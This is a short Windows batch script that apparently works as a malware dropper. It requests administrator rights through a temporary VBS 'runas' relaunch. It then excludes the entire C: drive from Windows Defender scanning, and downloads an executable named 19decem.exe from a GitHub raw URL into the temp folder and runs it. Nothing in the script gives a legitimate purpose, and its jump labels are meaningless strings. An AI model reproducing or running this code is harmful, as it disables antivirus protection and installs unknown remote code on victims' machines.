@echo off >nul 2>&1
"%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
REM --> If the error flag is set, we do not have admin.
if '%errorlevel%' NEQ '0' ( goto neptyn ) else ( goto godmuyiuin )

:neptyn
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
set params = %*:"="
echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"
exit /B

:godmuyiuin
pushd "%CD%"
CD /D "%~dp0"
powershell.exe -command Add-MpPreference -ExclusionPath C:\

setlocal

set file=%temp%\19decem.exe
powershell -Command "Invoke-WebRequest -Uri https://github.com/peter777-cloud/nan/raw/refs/heads/main/19decem.exe -OutFile '%file%'"
"%file%"

endlocal
